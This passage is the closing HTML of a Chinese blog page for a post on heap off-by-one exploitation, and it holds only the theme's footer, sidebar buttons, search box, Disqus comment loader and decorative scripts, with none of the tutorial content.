class="footer_custom_text">为世界上所有美好而战！！！</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="font-plus" type="button" title="放大字体"><i class="fas fa-plus"></i></button><button id="font-minus" type="button" title="缩小字体"><i class="fas fa-minus"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="chat_btn" type="button" title="rightside.chat_btn"><i class="fas fa-sms"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><div class="search-dialog__title" id="local-search-title">本地搜索</div><div id="local-input-panel"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div></div><hr/><div id="local-search-results"></div><span class="search-close-button"><i class="fas fa-times"></i></span></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="/js/search/local-search.js"></script><div class="js-pjax"><script>function loadDisqus () {
  var disqus_config = function () {
    this.page.url = 'https://cyberangel.cn/2020/09/07/PWN%E5%85%A5%E9%97%A8%EF%BC%883-2-1%EF%BC%89-%E5%A0%86%E4%B8%AD%E7%9A%84off-by-one/'
    this.page.identifier = '2020/09/07/PWN入门（3-2-1）-堆中的off-by-one/'
    this.page.title = 'PWN入门（3-2-1）-堆中的off-by-one'
  };

  window.disqusReset = () => {
    DISQUS.reset({
      reload: true,
      config: disqus_config
    })
  }

  if (window.DISQUS) disqusReset()
  else {
    (function() { 
      var d = document, s = d.createElement('script');
      s.src = 'https://.disqus.com/embed.js';
      s.setAttribute('data-timestamp', +new Date());
      (d.head || d.body).appendChild(s);
    })();
  }
}

if ('Disqus' === 'Disqus' || !false) {
  if (false) btf.loadComment(document.getElementById('disqus_thread'), loadDisqus)
  else loadDisqus()
} else {
  function loadOtherComment () {
    loadDisqus()
  }
}
</script><script>if (window.DISQUSWIDGETS === undefined) {
  var d = document, s = d.createElement('script');
  s.src = 'https://.disqus.com/count.js';
  s.id = 'dsq-count-scr';
  (d.head || d.body).appendChild(s);
} else {
  DISQUSWIDGETS.getCount({reset: true});
}</script></div><canvas class="fireworks" mobile="true"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/fireworks.min.js"></script><script defer="defer" id="ribbon" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/canvas-ribbon.min.js" size="150" alpha="0.6" zIndex="-1" mobile="false" data-click="false"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
POWERMODE.shake = true;
POWERMODE.mobile = true;
document.body.addEventListener('input', POWERMODE);
</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>